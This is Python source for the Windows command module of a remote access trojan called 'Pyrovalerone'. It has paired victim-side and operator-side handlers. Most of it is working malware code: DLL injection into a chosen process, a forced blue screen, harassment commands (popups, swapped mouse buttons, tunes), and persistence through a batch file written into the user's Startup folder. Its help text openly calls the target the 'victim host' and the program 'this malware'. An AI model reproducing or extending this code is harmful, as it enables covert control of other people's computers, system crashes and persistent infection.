"""
    Pyrovalerone
    Microsoft Windows(R) Module
    Note: Features remote administration logic for Windows OS
"""
import os
import BDModuleDefault
from BDWinRAT import WinRAT

# Modules to be registered at both client-side and server-side
_modules = ["msgbox", "bsod", "swapmouse", "beep", "injectdll", "playtune", "persist"]
_builtins = [""]

""""
	@class ClientMain
	@brief The block that will be invoked by the client (victim)
"""
class ClientMain(BDModuleDefault.ClientMain):

	def __init__(self, handler):
		super().__init__(handler)

		# Create new Windows RAT API instance
		self.rat = WinRAT()

		# Extend the default class with the new command modules
		self.registerCMDModules(_modules)

		"""
		@method msgbox
		@brief Displays a popup message on the client machine
		@param {list} argv Arguments array
		@return {str} Status of command exection
	"""
	def msgbox(self, argv):

		# Receive title
		title = self.handler.recv_msg()

		# Receive message
		message = self.handler.recv_msg()

		try:
			self.rat.msgbox(title=title, msg=message)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method bsod
		@brief Triggers a blue-screen of death on the client machine
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def bsod(self, argv):
		try:
			self.rat.bsod()
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method swapmouse
		@brief Swaps or restores the mouse buttons
		@param {list} argv Arguments array
		@return {str} Status of command exection
	"""
	def swapmouse(self, argv):
		try:
			if self.handler.recv_msg() == "on":
				self.rat.swapmouse(evil=1)
			else:
				self.rat.swapmouse(evil=0)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method beep
		@brief Plays a frequency for a given duration
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def beep(self, argv):
		try:
			freq = int(self.handler.recv_msg())
			duration = int(self.handler.recv_msg())
			self.rat.beep(freq, duration)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def playtune(self, argv):
		try:
			notes = self.handler.recv_msg()
			notes = notes.split(" ")

			repeat = int(self.handler.recv_msg())

			for i in range(0, repeat):
				self.rat.playNotes(notes)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method injectdll
		@brief injects a dynamic library into a running process
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def injectdll(self, argv):
		try:

			# Get process identifier
			pid = int(self.handler.recv_msg())

			# Get DLL path
			dll = str(self.handler.recv_msg())

			# Attempt injection
			self.rat.injectdll(pid, dll)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def persist(self, argv):

		# Receive status message
		status = self.handler.recv_msg()

		try:
			# Get the AppData folder path
			appData = os.getenv("APPDATA")

			# Build the startup folder path
			startupFolder = appData+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

			if status == "install":

				# Get the path to the folder with the python script
				virusPath = os.path.dirname(os.path.realpath(__file__))
				print(virusPath)

				# Generate batch code
				BATPAYLOAD = ""

				# Disable output
				BATPAYLOAD += "@echo off\n"

				# Enter virus directory
				BATPAYLOAD += "cd " + virusPath + "\n"

				# Execute the virus
				BATPAYLOAD += "python BDClient.py\n"

				# Exit cmd
				BATPAYLOAD += "exit\n"

				# Write batch payload to startup folder
				with open(startupFolder+"persist.bat", "w") as batchFile:
					batchFile.write(BATPAYLOAD)
					batchFile.close()

			elif status == "remove":

				# Check if module is persistent
				if os.path.exists(startupFolder+"persist.bat"):

					# Remove the persisting module
					os.remove(startupFolder+"persist.bat")

			else:

				# Check if persistence is present
				if os.path.exists(startupFolder+"persist.bat"):
					return "CMD_SUCCESS: Persistence installed: remove by running 'persist remove'."

				# If it is not let the user know
				else:
					return "CMD_SUCCESS: No persistence: install by running 'persist install'."

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

class ServerMain(BDModuleDefault.ServerMain):

	def __init__(self, handler):
		super().__init__(handler)
		
		# Register modules
		self.registerCMDModules(_modules)

		# Add usage
		self.registerCMDHelp("msgbox", "Displays a modal message on victim host\nUsage: msgbox [title] [message]")
		self.registerCMDHelp("bsod", "Triggers a blue-screen of death on victim host")
		self.registerCMDHelp("swapmouse", "Swaps or restores mouse buttons\nUsage: swapmouse [on|off]")
		self.registerCMDHelp("beep", "Plays a frequency for a period on the victim host\nUsage: beep [frequency] [duration]")
		self.registerCMDHelp("playtune", "Plays a melody on the victim host\nUsage: playtune [notes (eg C4:4 D4:1 etc.)] or [built-in melody name]")
		self.registerCMDHelp("persist", "Makes this malware run at boot\nUsage: persist [install|remove|status]")
		self.registerCMDHelp("injectdll", "Injects a dynamic library into a running process\nUsage: injectdll [pid] [remote dll path]")



	"""
		@method msgbox
		@brief displays a modal on the client machine
		@param {list} argv Arguments array
		@return {str} Command execution status as received from client
	"""
	def msgbox(self, argv):

		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		title = argv[1]
		msg = argv[2]

		# Send title
		self.handler.send_msg(title)

		# Send message
		self.handler.send_msg(msg)

		return self.handler.recv_msg()

	def bsod(self, argv):
		pass

	def swapmouse(self, argv):
		if len(argv) < 2:
			return 'INVALID_ARGUMENT'

		toggle = argv[1]

		# Send toggle
		self.handler.send_msg(toggle)

		return self.handler.recv_msg()

	def beep(self, argv):
		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		freq = argv[1]
		duration = argv[2]

		# Send frequency
		self.handler.send_msg(freq)

		# Send duration
		self.handler.send_msg(duration)

		return self.handler.recv_msg()

	def playtune(self, argv):
		if len(argv) < 3:
			return 'INVALID_ARGUMENT'


		tunes = {

			"soviet anthem": "C4:4 G3:3 A3:1 B3:4 E3:4 A3:4 G3:3 F3:1 G3:4 C3:2 C3:2 D3:4 D3:2 E3:2 F3:4 " +
							"F3:2 G3:2 A3:4 B3:2 C4:2 D4:6 G3:2 E4:4 D4:3 C4:1 D4:4 B3:2 G3:2 C4:4 B3:3 " +
							"A3:1 B3:4 E3:2 E3:2 A3:4 G3:2 F3:2 G3:4 C3:2 C3:2 C4:4 B3:3 A3:1 G3:6 " +
							".:4 .:4",

			"rickroll": "A3:4 B3:4 C4:2 C4:4 D4:4 B3:2 A3:2 G3:4 " + # We are no strangers in love
						"A3:4 A3:4 B3:4 C4:2 A3:4 G3:4 G4:4 G4:4 D4:4 " + # You know the rules and so do I
						"A3:4 A3:4 B3:2 C4:2 A3:2 C4:4 D4:4 B3:2 A3:2 B3:2 A3:2 G3:2 " + # A full commitment's what I'm thinking of
						"A3:4 A3:2 B3:2 C4:4 A3:4 G3:4 D4:2 D4:2 D4:2 E4:2 D4:2 " + # You would not get this from any other guy
						"C4:4 D4:4 E4:2 C4:2 D4:4 D4:4 D4:4 D4:4 E4:4 D4:2 G3:2 " + # I just wanna tell you how I'm feeling
						"A3:2 B3:2 C4:4 A3:4 D4:2 E4:2 D4:2 " + # Gotta make you understand...
						"G3:2 A3:2 C4:2 A3:2 E4:4 E4:4 D4:4 " + # Never gonna give you up
						"G3:2 A3:2 C4:2 A3:2 D4:4 D4:4 C4:2 B3:2 A3:2 " + # Never gonna let you down
						"G3:2 A3:2 C4:2 A3:2 C4:4 D4:2 B3:2 G3:4 G3:2 D4:2 C4:4 " +# Never gonna run around and desert you
						"G3:2 A3:2 C4:2 A3:2 E4:4 E4:4 D4:4 " + # Never gonna make you cry
						"G3:2 A3:2 C4:2 A3:2 D4:4 D4:4 C4:2 B3:2 A3:2 " + # Never gonna say goodbye
						"G3:2 A3:2 C4:2 A3:2 C4:4 D4:4 B3:2 G3:4 G3:4 D4:4 C4:4 .:4 .:4" # Never gonna tell a lie and hurt you
		}

		notes = argv[1]
		repeat = argv[2]
		if notes in tunes.keys():
			notes = tunes[notes]

		# Send notes
		self.handler.send_msg(notes)

		# Send repeat count
		self.handler.send_msg(repeat)

		return self.handler.recv_msg()

	def injectdll(self, argv):
		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		pid = argv[1]
		dll = argv[2]

		# Send process id
		self.handler.send_msg(pid)

		# Send dll path
		self.handler.send_msg(dll)

		return self.handler.recv_msg()

	def persist(self, argv):
		
		if len(argv) < 2:
			return 'INVALID_ARGUMENT'

		status = argv[1]

		self.handler.send_msg(status)

		return self.handler.recv_msg()